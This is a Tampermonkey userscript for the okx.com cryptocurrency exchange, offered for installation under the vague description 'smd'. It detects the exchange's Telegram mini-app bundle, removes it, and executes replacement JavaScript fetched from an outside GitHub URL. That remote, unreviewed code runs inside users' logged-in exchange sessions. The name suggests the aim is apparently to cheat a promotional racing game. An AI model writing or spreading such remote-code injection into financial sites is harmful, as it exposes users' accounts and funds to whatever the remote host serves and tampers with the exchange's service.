// ==UserScript==
// @name         Gonshik Nelegalny
// @version      1
// @license      MIT
// @description  smd
// @author       sybilyi
// @icon         https://www.iconarchive.com/download/i140191/microsoft/fluentui-emoji-flat/Manual-Wheelchair-Flat.ico
// @grant        none
// @namespace    http://tampermonkey.net/
// @match        https://www.okx.com/*
// @downloadURL https://update.greasyfork.org/scripts/502224/Gonshik%20Nelegalny.user.js
// @updateURL https://update.greasyfork.org/scripts/502224/Gonshik%20Nelegalny.meta.js
// ==/UserScript==
 
(function() {
    'use strict';
 
    // URL of the script to be injected
    const pastebinUrl = 'https://raw.githubusercontent.com/fordangg/racer/main/index.cca112cb.js';
    // Pattern to match the target script URL
    const targetUrlPattern = /https:\/\/www\.okx\.com\/cdn\/assets\/okfe\/growth\/telegram-mini-app\/index\..*\.js/;
 
    // Function to replace the script
    function replaceScript() {
        const scripts = document.getElementsByTagName('script');
        for (let i = 0; i < scripts.length; i++) {
            if (targetUrlPattern.test(scripts[i].src)) {
                // Create a new script element with the content from the specified URL
                fetch(pastebinUrl)
                    .then(response => response.text())
                    .then(scriptContent => {
                        const newScript = document.createElement('script');
                        newScript.textContent = scriptContent;
                        document.head.appendChild(newScript);
 
                        // Remove the old script
                        scripts[i].parentNode.removeChild(scripts[i]);
 
                        // Once replaced, disconnect the observer and stop further checks
                        observer.disconnect();
                    });
                break;
            }
        }
    }
 
    // Set up a MutationObserver to monitor changes in the DOM
    const observer = new MutationObserver(function(mutations) {
        mutations.forEach(function(mutation) {
            if (mutation.addedNodes.length) {
                replaceScript();
            }
        });
    });
 
    // Observer configuration
    const config = {
        childList: true,
        subtree: true
    };
 
    // Start observing
    observer.observe(document.body, config);
 
    // Initial script replacement attempt
    replaceScript();
})();